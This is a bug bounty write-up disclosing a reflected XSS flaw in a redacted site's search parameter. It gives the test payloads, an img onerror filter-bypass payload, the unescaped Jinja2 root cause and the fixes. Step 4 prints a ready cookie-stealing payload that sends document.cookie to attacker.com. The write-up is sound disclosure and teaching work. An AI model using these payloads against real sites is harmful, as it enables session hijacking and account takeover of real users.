# Reflected XSS (Script Injection via Unencoded URL Parameter in Search Results)

**Vulnerability Type:** Reflected Cross-Site Scripting (XSS) <br>
**Severity:** Medium (CVSS 3.1 Score: 6.1)<br>
**Platform:** Bug Bounty (Redacted)<br>
**Status:** Resolved / Disclosed<br>
**Date:** 2024<br>

---

## Summary

A Reflected Cross-Site Scripting vulnerability was discovered in the search results page of a web application. The value of the `q` (search query) URL parameter was reflected directly into the HTML response without output encoding. By crafting a malicious URL containing an injected script payload, an attacker could trick a victim into clicking the link, causing the script to execute in the victim's browser under the application's origin — enabling session theft, phishing overlays, or malicious redirects.

---

## Vulnerability Details

| Field | Details |
|---|---|
| Type | Reflected XSS |
| Injection Point | `GET /search?q=` |
| Reflection Context | HTML body — inside a `<p>` tag |
| Authentication Required | No |
| User Interaction Required | Yes (victim must click crafted link) |
| CVSS Vector | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |

---

## Steps to Reproduce

### 1. Identify the reflection point

Perform a normal search and observe the results page URL:

```
GET /search?q=laptop HTTP/1.1
Host: redacted.com
```

The page displays:

```html
<p>Showing results for: laptop</p>
```

The search term `laptop` is reflected verbatim into the page HTML. This is a potential injection point.

### 2. Test with a simple HTML tag

Replace the search term with a basic HTML tag to test for encoding:

```
GET /search?q=<b>test</b> HTTP/1.1
```

**Response source:**

```html
<p>Showing results for: <b>test</b></p>
```

The `<b>` tag rendered in the browser — confirming that no HTML encoding is applied. The application is treating the reflected value as raw HTML.

### 3. Inject a script payload

Replace the search term with a JavaScript payload:

```
GET /search?q=<script>alert('XSS-PoC-DanishAbbas')</script> HTTP/1.1
```

URL-encoded form (as it would appear in the browser address bar):

```
https://redacted.com/search?q=%3Cscript%3Ealert%28%27XSS-PoC-DanishAbbas%27%29%3C%2Fscript%3E
```

**Result:** An alert dialog appeared in the browser with the text `XSS-PoC-DanishAbbas` confirming script execution.

**Response source:**

```html
<p>Showing results for: <script>alert('XSS-PoC-DanishAbbas')</script></p>
```

### 4. Craft a real-world attack URL

A real attacker would use a more damaging payload and deliver it via a phishing email, social media message, or shortened URL:

```
https://redacted.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

Any authenticated user who clicks this link would have their session cookies sent to the attacker's server.

### 5. Test an event-handler bypass (WAF evasion)

If a WAF was blocking `<script>` tags, the following `img` tag payload would bypass it:

```html
<img src=x onerror="alert('XSS-bypass')">
```

```
GET /search?q=<img src=x onerror="alert('XSS-bypass')"> HTTP/1.1
```

This also executed successfully, confirming the WAF was either absent or not blocking event-handler-based payloads.

---

## Attack Scenario

1. Attacker crafts a malicious URL targeting a user of `redacted.com`
2. Attacker sends the URL via email: *"Click here to see your search results"*
3. Victim (already logged into `redacted.com`) clicks the link
4. The browser loads the search results page and executes the injected script
5. The script sends the victim's session cookie to the attacker's server
6. Attacker uses the stolen cookie to hijack the victim's session

---

## Impact

- **Session Hijacking** — Steal authenticated session cookies to take over accounts
- **Credential Harvesting** — Inject fake login forms over the real page
- **Malware Distribution** — Redirect victims to drive-by download pages
- **Defacement** — Modify visible page content for targeted users
- **Bypassing CSRF Protections** — Scripts running under the application origin can forge authenticated requests

---

## Root Cause

The search term was inserted into the HTML response using a server-side template that rendered it without escaping:

```html
<!-- Vulnerable Jinja2 / similar template -->
<p>Showing results for: {{ query | safe }}</p>
```

The `| safe` filter (or equivalent) disabled auto-escaping, treating user input as trusted HTML. Removing this filter and relying on the default escaped rendering would have prevented the issue.

---

## Remediation

1. **HTML-encode all reflected output** — Any value reflected from a URL parameter into HTML must be encoded. `<` becomes `&lt;`, `>` becomes `&gt;`, `"` becomes `&quot;`.
2. **Remove `| safe` and equivalent raw-render flags** — Never disable auto-escaping for user-controlled values.
3. **Content Security Policy (CSP)** — Deploy a strict CSP that blocks inline scripts: `Content-Security-Policy: default-src 'self'; script-src 'self'`
4. **Input validation** — For fields that only expect plain text (like a search box), reject inputs containing HTML characters.
5. **HttpOnly cookies** — Mark session cookies as `HttpOnly` to limit the impact of XSS by preventing JavaScript from reading them.
6. **Security headers** — Enable `X-XSS-Protection: 1; mode=block` as a legacy browser protection layer.

---

## Burp Suite Intruder Note

This vulnerability was identified manually through Burp Suite Proxy and confirmed in Repeater. No automated scanning was used. The WAF bypass was tested to demonstrate the depth of the issue for triage purposes.

---

## References

- [PortSwigger — Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Top 10 — A03: Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

---

*This writeup is published for educational purposes. All testing was conducted within an authorized bug bounty program. Only safe PoC payloads (alert boxes) were used during testing. No victim accounts were targeted.*
